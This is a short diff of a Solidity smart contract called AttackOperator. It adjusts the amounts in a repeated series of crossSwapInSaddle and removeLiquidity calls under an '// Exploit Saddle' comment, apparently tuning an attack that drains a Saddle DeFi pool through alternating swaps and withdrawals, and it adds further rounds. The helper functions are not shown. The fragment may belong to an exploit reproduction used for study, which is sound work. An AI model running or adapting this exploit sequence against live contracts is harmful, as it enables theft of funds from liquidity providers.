@@ -115,27 +115,35 @@ contract AttackOperator {
 
         // Exploit Saddle
 
-        uint susd = crossSwapInSaddle(18_000_000e18);
+        uint susd = crossSwapInSaddle(18_100_000e18);
 
-        removeLiquidity(7_000_000e18);
+        removeLiquidity(8_000_000e18);
 
-        crossSwapInSaddle(10_000_000e18);
+        crossSwapInSaddle(16_460_000e18);
 
-        removeLiquidity(1_500_000e18);
+        removeLiquidity(540_000e18);
 
-        crossSwapInSaddle(7_000_000e18);
+        crossSwapInSaddle(1_586_000e18);
 
-        removeLiquidity(300_000e18);
+        removeLiquidity(70_000e18);
 
-        crossSwapInSaddle(1_800_000e18);
+        crossSwapInSaddle(423_000e18);
 
-        removeLiquidity(200_000e18);
+        removeLiquidity(40_000e18);
 
-        crossSwapInSaddle(1_370_000e18);
+        crossSwapInSaddle(135_000e18);
 
-        removeLiquidity(100_000e18);
+        removeLiquidity(10_000e18);
 
-        crossSwapInSaddle(720_000e18);
+        crossSwapInSaddle(38_700e18);
+
+        removeLiquidity(3_000e18);
+
+        crossSwapInSaddle(11_700e18);
+
+        removeLiquidity(1_000e18);
+
+        crossSwapInSaddle(3_700e18);
 
 
 
